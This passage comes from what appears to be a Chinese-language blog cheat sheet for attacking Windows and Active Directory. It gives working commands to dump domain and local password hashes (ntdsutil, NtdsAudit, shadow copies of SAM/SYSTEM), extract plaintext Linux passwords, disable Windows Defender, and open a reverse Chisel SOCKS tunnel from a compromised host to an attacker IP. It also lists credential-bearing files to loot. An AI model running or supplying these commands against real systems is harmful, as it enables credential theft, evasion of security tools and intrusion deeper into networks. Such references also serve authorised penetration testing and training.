+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ntdsutil</span><br><span class="line">ntdsutil: activate instance ntds</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:\audit</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure>
+<p>使用NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe" target="_blank" rel="noopener">下载地址</a>解出ntds的hash</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtdsAudit.exe <span class="string">"ntds.dit"</span> -s <span class="string">"SYSTEM"</span> -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure>
+<p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p>
+<ul>
+<li>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在命令提示符下，键入以下命令，然后按ENTER键：</span></span><br><span class="line">ntdsutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span></span><br><span class="line">activate instance ntds</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span></span><br><span class="line">ifm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在ifm提示符下，键入以下命令，然后按Enter：</span></span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;Drive&gt;:\&lt;Folder&gt; 是要创建的文件的文件夹路径。</span></span><br></pre></td></tr></table></figure>
+<p>  例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</span><br></pre></td></tr></table></figure>
+<h4 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h4><p>mimipenguin</p>
+<p>git clone <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p>
+<p>支持的操作系统</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">os</th>
+<th style="text-align:left">service</th>
+<th style="text-align:left">supported</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Ubuntu Desktop 12.04 LTS x64</td>
+<td style="text-align:left">gnome-keyring-daemon (3.18.3)</td>
+<td style="text-align:left">Y</td>
+</tr>
+<tr>
+<td style="text-align:left">Ubuntu Desktop 16.04 LTS x64</td>
+<td style="text-align:left">gnome-keyring-daemon (3.18.3)</td>
+<td style="text-align:left">Y</td>
+</tr>
+<tr>
+<td style="text-align:left">Fedora Workstation 25 (x86_64)</td>
+<td style="text-align:left">gnome-keyring-daemon (3.20.0)</td>
+<td style="text-align:left">Y</td>
+</tr>
+<tr>
+<td style="text-align:left">Fedora Workstation 27 (x86_64)</td>
+<td style="text-align:left">gnome-keyring-daemon (3.20.1)</td>
+<td style="text-align:left">Y</td>
+</tr>
+<tr>
+<td style="text-align:left">Kali-rolling x64</td>
+<td style="text-align:left">gnome-keyring-daemon (3.28.0.2)</td>
+<td style="text-align:left">Y</td>
+</tr>
+</tbody>
+</table>
+<h4 id="从卷影副本中转储快照"><a href="#从卷影副本中转储快照" class="headerlink" title="从卷影副本中转储快照"></a>从卷影副本中转储快照</h4><p>我们还可以创建<code>SAM</code>和<code>SYSTEM</code>文件的“卷影副本” （它们始终锁定在当前系统上），因此我们仍然可以将它们复制到本地系统中。为此需要提升的提示</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy call create Volume=<span class="string">'C:\'</span></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system</span><br></pre></td></tr></table></figure>
+<h3 id="关闭Windows-Defender"><a href="#关闭Windows-Defender" class="headerlink" title="关闭Windows Defender"></a>关闭Windows Defender</h3><p>👀🚩</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -DisableRealtimeMonitoring <span class="literal">$true</span></span><br><span class="line"></span><br><span class="line">Set-MpPreference -DisableIOAVProtection <span class="literal">$true</span></span><br></pre></td></tr></table></figure>
+<p>或将Defender保持启用状态，然后从其中删除签名。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"C:\Program Files\Windows Defender\MpCmdRun.exe"</span> -RemoveDefinitions -All</span><br></pre></td></tr></table></figure>
+<h3 id="Chisel-代理"><a href="#Chisel-代理" class="headerlink" title="Chisel 代理"></a>Chisel 代理</h3><p>这是一个有关如何设置Socks代理以在受感染主机上进行凿凿的示例。凿子还可以做更多的事情！</p>
+<p>在攻击者机器（Linux或Windows）上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8888 --reverse</span><br></pre></td></tr></table></figure>
+<p>目标执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\chisel_windows_386.exe client <span class="number">10.10</span>.<span class="number">16.7</span>:<span class="number">8888</span> R:<span class="number">8001</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9001</span></span><br></pre></td></tr></table></figure>
+<p>现在，我们正在侦听<code>localhost:8001</code>攻击机，以将流量转发给<code>target:9001</code>。</p>
+<p>然后，打开Socks服务器。估计的正好：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\chisel_windows_386.exe server -p <span class="number">9001</span> --socks5</span><br></pre></td></tr></table></figure>
+<p>在攻击机上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client localhost:8001 socks</span><br></pre></td></tr></table></figure>
+<p>现在，在攻击计算机的端口1080上打开了一个代理。</p>
+<h3 id="Juicy-files"><a href="#Juicy-files" class="headerlink" title="Juicy files"></a>Juicy files</h3><p>有很多文件可能包含有趣的信息。<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">WinPEAS</a>类的工具或<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">PowerSploit</a>类的<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">集合</a>可能有助于识别多汁的文件（用于privesc或post-exploitation）。</p>
+<p>以下是我遇到过的一些相关文件的列表。根据计算机上安装的程序和/或服务检查文件。</p>
+<blockquote>
+<p>此外，不要忘记使用<code>sqlcmd</code>或枚举任何本地数据库<code>Invoke-SqlCmd</code>。</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 所有用户文件夹</span></span><br><span class="line"><span class="comment">## 如果文件太多，请限制此命令;）</span></span><br><span class="line">tree /f /a C:\Users</span><br><span class="line"></span><br><span class="line"><span class="comment"># Web.config</span></span><br><span class="line">C:\inetpub\www\*\web.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unattend 文件</span></span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP 配置文件</span></span><br><span class="line">C:\ProgramData\Configs\</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell scripts/config 文件</span></span><br><span class="line">C:\Program Files\Windows PowerShell\</span><br><span class="line"></span><br><span class="line"><span class="comment"># PuTTy 配置文件</span></span><br><span class="line">C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla 证书</span></span><br><span class="line">C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jenkins creds (also check out the Windows vault, see above)</span></span><br><span class="line">C:\Program Files\Jenkins\credentials.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># WLAN profiles</span></span><br><span class="line">C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># TightVNC 密码 (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> -Path HKLM:\Software\TightVNC\Server -Name <span class="string">"Password"</span> | select -ExpandProperty Password</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">士不可以不弘毅，任重而道远。<i class="fa fa-paw"></i>仁以为己任，不亦重乎？死而后已，不亦远乎？</div>
+    
+</div>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="js/src/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="js/src/jquery-1.7.1.min.js"></script>
+  <script src="js/src/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="js/src/sweetalert.mini.css">
+
+  <p><span>本文标题:</span>Windows和Active Directory备忘单和命令参考</a></p>
+  <p><span>文章作者:</span>yaron</a></p>
+  <p><span>发布时间:</span>2021年05月19日 - 16:14:10</p>
+  <p><span>最后更新:</span>2021年05月19日 - 16:17:30</p>
+  <p><span>原文链接:</span><a href="/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html" title="Windows和Active Directory备忘单和命令参考">https://yaalonsong.github.io/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html</a>
+     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://yaalonsong.github.io/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div></div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/uploads/wechat.jpg" alt="yaron WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/域/" rel="tag"><i class="fa fa-tags"></i> 域</a>
+          
+            <a href="/tags/备忘录/" rel="tag"><i class="fa fa-tags"></i> 备忘录</a>
+          
+            <a href="/tags/AD/" rel="tag"><i class="fa fa-tags"></i> AD</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/04/漏洞安全知识Wiki.html" rel="next" title="漏洞安全知识Wiki">
+                <i class="fa fa-chevron-left"></i> 漏洞安全知识Wiki
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjI3MC84ODM0"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="yaron" />
+          <p class="site-author-name" itemprop="name">yaron</p>
+           
+              <p class="site-description motion-element" itemprop="description">网络安全|渗透测试|Python|漏洞挖掘|漏洞复现</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/341306234" target="_blank" title="新浪微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  新浪微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/yaalonsong" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:yaron@yl0.org" target="_blank" title="mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                  mail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://music.163.com/#/user/home?id=271097430" target="_blank" title="网易云音乐">
+                  
+                    <i class="fa fa-fw fa-music"></i>
+                  
+                  网易云音乐
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://wyb0.com" title="Reber’s Blog" target="_blank">Reber’s Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.marksec.org/" title="Mark’s Blog" target="_blank">Mark’s Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.payload.tk/" title="Sòng•Blog" target="_blank">Sòng•Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.bogotobogo.com/" title="BogoToBogo" target="_blank">BogoToBogo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://start.me/p/PwlKgn/apt-osint-labs" title="APT实战资源" target="_blank">APT实战资源</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ired.team/" title="ired" target="_blank">ired</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://wizardforcel.gitbooks.io/py-re-guide/content/" title="正则" target="_blank">正则</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows和Active-Directory备忘单和命令参考"><span class="nav-number">1.</span> <span class="nav-text"><a href="#Windows&#x548C;Active-Directory&#x5907;&#x5FD8;&#x5355;&#x548C;&#x547D;&#x4EE4;&#x53C2;&#x8003;" class="headerlink" title="Windows&#x548C;Active Directory&#x5907;&#x5FD8;&#x5355;&#x548C;&#x547D;&#x4EE4;&#x53C2;&#x8003;"></a>Windows&#x548C;Active Directory&#x5907;&#x5FD8;&#x5355;&#x548C;&#x547D;&#x4EE4;&#x53C2;&#x8003;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#General"><span class="nav-number">1.1.</span> <span class="nav-text"><a href="#General" class="headerlink" title="General"></a>General</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell-AMSI-Bypass"><span class="nav-number">1.1.1.</span> <span class="nav-text"><a href="#PowerShell-AMSI-Bypass" class="headerlink" title="PowerShell AMSI Bypass"></a>PowerShell AMSI Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell-one-liners"><span class="nav-number">1.1.2.</span> <span class="nav-text"><a href="#PowerShell-one-liners" class="headerlink" title="PowerShell one-liners"></a>PowerShell one-liners</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反射式加载PowerShell脚本"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"><a href="#&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;PowerShell&#x811A;&#x672C;" class="headerlink" title="&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;PowerShell&#x811A;&#x672C;"></a><strong>&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;PowerShell&#x811A;&#x672C;</strong></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反射式加载C＃程序集"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"><a href="#&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;C&#xFF03;&#x7A0B;&#x5E8F;&#x96C6;" class="headerlink" title="&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;C&#xFF03;&#x7A0B;&#x5E8F;&#x96C6;"></a><strong>&#x53CD;&#x5C04;&#x5F0F;&#x52A0;&#x8F7D;C&#xFF03;&#x7A0B;&#x5E8F;&#x96C6;</strong></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下载文件"><span class="nav-number">1.1.2.3.</span> <span class="nav-text"><a href="#&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;" class="headerlink" title="&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;"></a>&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码命令"><span class="nav-number">1.1.2.4.</span> <span class="nav-text"><a href="#&#x7F16;&#x7801;&#x547D;&#x4EE4;" class="headerlink" title="&#x7F16;&#x7801;&#x547D;&#x4EE4;"></a>&#x7F16;&#x7801;&#x547D;&#x4EE4;</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#枚举"><span class="nav-number">1.2.</span> <span class="nav-text"><a href="#&#x679A;&#x4E3E;" class="headerlink" title="&#x679A;&#x4E3E;"></a><strong>&#x679A;&#x4E3E;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用PowerView进行AD枚举"><span class="nav-number">1.2.1.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;AD&#x679A;&#x4E3E;" class="headerlink" title="&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;AD&#x679A;&#x4E3E;"></a><strong>&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;AD&#x679A;&#x4E3E;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AppLocker"><span class="nav-number">1.2.2.</span> <span class="nav-text"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell受限语言模式"><span class="nav-number">1.2.3.</span> <span class="nav-text"><a href="#PowerShell&#x53D7;&#x9650;&#x8BED;&#x8A00;&#x6A21;&#x5F0F;" class="headerlink" title="PowerShell&#x53D7;&#x9650;&#x8BED;&#x8A00;&#x6A21;&#x5F0F;"></a>PowerShell&#x53D7;&#x9650;&#x8BED;&#x8A00;&#x6A21;&#x5F0F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LAPS"><span class="nav-number">1.2.4.</span> <span class="nav-text"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">1.3.</span> <span class="nav-text"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Powercat反向shell"><span class="nav-number">1.3.1.</span> <span class="nav-text"><a href="#Powercat&#x53CD;&#x5411;shell" class="headerlink" title="Powercat&#x53CD;&#x5411;shell"></a>Powercat&#x53CD;&#x5411;shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向运动"><span class="nav-number">1.4.</span> <span class="nav-text"><a href="#&#x6A2A;&#x5411;&#x8FD0;&#x52A8;" class="headerlink" title="&#x6A2A;&#x5411;&#x8FD0;&#x52A8;"></a>&#x6A2A;&#x5411;&#x8FD0;&#x52A8;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用PowerView进行横向运动枚举"><span class="nav-number">1.4.1.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x8FD0;&#x52A8;&#x679A;&#x4E3E;" class="headerlink" title="&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x8FD0;&#x52A8;&#x679A;&#x4E3E;"></a>&#x4F7F;&#x7528;PowerView&#x8FDB;&#x884C;&#x6A2A;&#x5411;&#x8FD0;&#x52A8;&#x679A;&#x4E3E;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BloodHound"><span class="nav-number">1.4.2.</span> <span class="nav-text"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberoasting"><span class="nav-number">1.4.3.</span> <span class="nav-text"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Automatic"><span class="nav-number">1.4.3.1.</span> <span class="nav-text"><a href="#Automatic" class="headerlink" title="Automatic"></a>Automatic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Manual"><span class="nav-number">1.4.3.2.</span> <span class="nav-text"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Targeted-kerberoasting-by-setting-SPN"><span class="nav-number">1.4.3.3.</span> <span class="nav-text"><a href="#Targeted-kerberoasting-by-setting-SPN" class="headerlink" title="Targeted kerberoasting by setting SPN"></a>Targeted kerberoasting by setting SPN</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AS-REP-roasting"><span class="nav-number">1.4.4.</span> <span class="nav-text"><a href="#AS-REP-roasting" class="headerlink" title="AS-REP roasting"></a>AS-REP roasting</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"><span class="nav-number">1.4.4.1.</span> <span class="nav-text"><a href="#&#x901A;&#x8FC7;&#x7981;&#x7528;Kerberos&#x9884;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8FDB;&#x884C;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;AS-REP&#x6F2B;&#x6E38;" class="headerlink" title="&#x901A;&#x8FC7;&#x7981;&#x7528;Kerberos&#x9884;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8FDB;&#x884C;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;AS-REP&#x6F2B;&#x6E38;"></a><strong>&#x901A;&#x8FC7;&#x7981;&#x7528;Kerberos&#x9884;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x8FDB;&#x884C;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;AS-REP&#x6F2B;&#x6E38;</strong></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token-Manipulation"><span class="nav-number">1.4.5.</span> <span class="nav-text"><a href="#Token-Manipulation" class="headerlink" title="Token Manipulation"></a>Token Manipulation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Incognito"><span class="nav-number">1.4.5.1.</span> <span class="nav-text"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Invoke-TokenManipulation"><span class="nav-number">1.4.5.2.</span> <span class="nav-text"><a href="#Invoke-TokenManipulation" class="headerlink" title="Invoke-TokenManipulation"></a>Invoke-TokenManipulation</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz"><span class="nav-number">1.4.6.</span> <span class="nav-text"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用schtasks执行命令"><span class="nav-number">1.4.7.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;schtasks&#x6267;&#x884C;&#x547D;&#x4EE4;" class="headerlink" title="&#x4F7F;&#x7528;schtasks&#x6267;&#x884C;&#x547D;&#x4EE4;"></a><strong>&#x4F7F;&#x7528;schtasks&#x6267;&#x884C;&#x547D;&#x4EE4;</strong></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用WMI执行命令"><span class="nav-number">1.4.8.</span> <span class="nav-text"><a href="#&#x4F7F;&#x7528;WMI&#x6267;&#x884C;&#x547D;&#x4EE4;" class="headerlink" title="&#x4F7F;&#x7528;WMI&#x6267;&#x884C;&#x547D;&#x4EE4;"></a><strong>&#x4F7F;&#x7528;WMI&#x6267;&#x884C;&#x547D;&#x4EE4;</strong></span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">1.4.8.1.</span> <span class="nav-text"><a href="#Windows" class="headerlink" 